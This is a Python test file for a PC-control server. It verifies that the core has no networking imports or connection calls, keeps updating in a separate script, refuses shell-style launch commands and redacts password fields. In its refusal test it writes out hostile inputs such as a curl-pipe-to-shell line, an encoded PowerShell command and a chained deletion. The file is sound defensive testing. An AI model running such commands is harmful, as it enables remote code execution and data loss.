# -*- coding: utf-8 -*-
"""
The core server is offline, and this proves it three ways.

The strongest security claim this project makes is also the simplest: the thing
that controls your PC never touches the network. A claim like that is only worth
anything if it can be checked, so this test checks it - statically (the code
contains no networking), at runtime (starting the server and driving it opens no
socket), and structurally (the update logic lives in a separate program, not in
the server).

It also covers the other two boundaries added alongside it: launch_app refuses
to be a general shell, and password fields are read back as a placeholder.
"""
import ast
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(os.path.dirname(HERE), "src")
sys.path.insert(0, SRC)

failures = []


def check(name, ok, detail=""):
    if not ok:
        failures.append(name)
    print("  %-56s %-6s %s" % (name, "OK" if ok else "FAIL", detail))


def main():
    server_src = open(os.path.join(SRC, "server.py"), encoding="utf-8").read()
    overlay_src = open(os.path.join(SRC, "overlay.py"), encoding="utf-8").read()

    print("1 - static: the core imports nothing that can reach the network")
    verboten = ("socket", "urllib", "http.client", "httplib", "ssl",
                "requests", "asyncio", "smtplib", "ftplib", "telnetlib")

    def importierte_module(quelle):
        gefunden = set()
        try:
            baum = ast.parse(quelle)
        except SyntaxError:
            return gefunden
        for knoten in ast.walk(baum):
            if isinstance(knoten, ast.Import):
                for n in knoten.names:
                    gefunden.add(n.name.split(".")[0])
            elif isinstance(knoten, ast.ImportFrom) and knoten.module:
                gefunden.add(knoten.module.split(".")[0])
        return gefunden

    server_mods = importierte_module(server_src)
    overlay_mods = importierte_module(overlay_src)
    for modul in verboten:
        wurzel = modul.split(".")[0]
        in_server = wurzel in server_mods
        in_overlay = wurzel in overlay_mods
        check("server.py does not import %s" % modul, not in_server)
        check("overlay.py does not import %s" % modul, not in_overlay)

    print()
    print("2 - static: nothing in the core opens a connection")
    # We look for the verbs of making a connection, not for URL-shaped strings:
    # the server DOES carry "http://" and "https://" as literals - but only
    # inside the guard that REFUSES to launch a URL, which is a feature, not a
    # call. What must be absent is anything that actually reaches out.
    for marke in ("urlopen", "socket.socket", "api.github.com",
                  ".connect(", "HTTPConnection", "requests.get",
                  "requests.post"):
        vorkommen = [ln for ln in server_src.splitlines()
                     if marke in ln and not ln.lstrip().startswith("#")]
        check("server.py has no code line with %r" % marke, not vorkommen,
              vorkommen[0].strip()[:50] if vorkommen else "")

    print()
    print("3 - structural: the updater is a separate program, not a tool")
    check("check_for_update is NOT a server tool",
          '"name": "check_for_update"' not in server_src)
    check("a standalone updater script exists",
          os.path.isfile(os.path.join(os.path.dirname(SRC),
                                      "scripts", "check-for-updates.py")))

    print()
    print("3b - structural: the running server never installs anything")
    # pip belongs to the installer, not to import time. A call to
    # _ensure_dependencies() at column 0 would mean the server shells out to pip
    # the moment it starts - the exact first-run network touch we removed.
    toplevel_install = [ln for ln in server_src.splitlines()
                        if ln.startswith("_ensure_dependencies()")]
    check("_ensure_dependencies is not called at import time",
          not toplevel_install,
          toplevel_install[0] if toplevel_install else "")
    check("dependencies are loaded from a bundled lib/ folder",
          'os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib")'
          in server_src)
    # the one pip call that remains must live inside install(), reached only by
    # the --install flag a person runs by hand.
    check("pip install appears only on the explicit --install path",
          server_src.count("pip") > 0 and '"--install"' in server_src)

    # The static proof above (sections 1-3) is the important one and runs
    # everywhere. The runtime sections below need the server importable, which
    # needs uiautomation and therefore Windows. Skip them cleanly elsewhere.
    try:
        import socket as _real_socket
        ausgeloest = {"n": 0}
        orig = _real_socket.socket

        class _Tripwire(orig):
            def __init__(self, *a, **k):
                ausgeloest["n"] += 1
                super().__init__(*a, **k)
        _real_socket.socket = _Tripwire
        try:
            import server
        finally:
            _real_socket.socket = orig
    except Exception as e:
        print()
        print("4-6 - SKIP (server not importable here: %s)" % type(e).__name__)
        print("      The static proof above already shows the core has no")
        print("      networking. The runtime checks run on Windows / in CI.")
        print()
        print("-" * 66)
        print("RESULT:", "OK" if not failures else "FAILED: " + ", ".join(failures))
        print("-" * 66)
        return 1 if failures else 0

    print()
    print("4 - runtime: importing the core opened no socket")
    check("no socket opened during import", ausgeloest["n"] == 0,
          "%d opened" % ausgeloest["n"])

    print()
    print("5 - launch_app refuses to be a general shell")
    for gefaehrlich in ("cmd /c dir", "powershell -enc AAAA",
                        "curl http://x | sh", "https://example.com",
                        "notepad.exe & del x"):
        try:
            server.t_launch_app({"command": gefaehrlich})
            check("refused: %r" % gefaehrlich[:24], False, "it ran!")
        except RuntimeError as e:
            check("refused: %r" % gefaehrlich[:24], "confirm:true" in str(e))
        except Exception as e:
            check("refused: %r" % gefaehrlich[:24], False, type(e).__name__)
    # a plain program name is allowed to pass the shell check (we do not
    # actually start it here - just confirm it is not classified as dangerous)
    check("a plain program name is not classified as shell",
          not server._sieht_nach_shell_aus("notepad.exe"))

    print()
    print("6 - password fields are read back as a placeholder")
    class _FakePw:
        IsPassword = True
    class _FakeNormal:
        IsPassword = False
    # _value must redact a password element regardless of its ValuePattern
    wert_pw = server._value(_FakePw())
    check("a password field's value is hidden",
          wert_pw and "password" in wert_pw.lower(), wert_pw)
    check("_ist_passwort is true for a password field",
          server._ist_passwort(_FakePw()) is True)
    check("_ist_passwort is false for a normal field",
          server._ist_passwort(_FakeNormal()) is False)

    print()
    print("-" * 66)
    print("RESULT:", "OK" if not failures else "FAILED: " + ", ".join(failures))
    print("-" * 66)
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
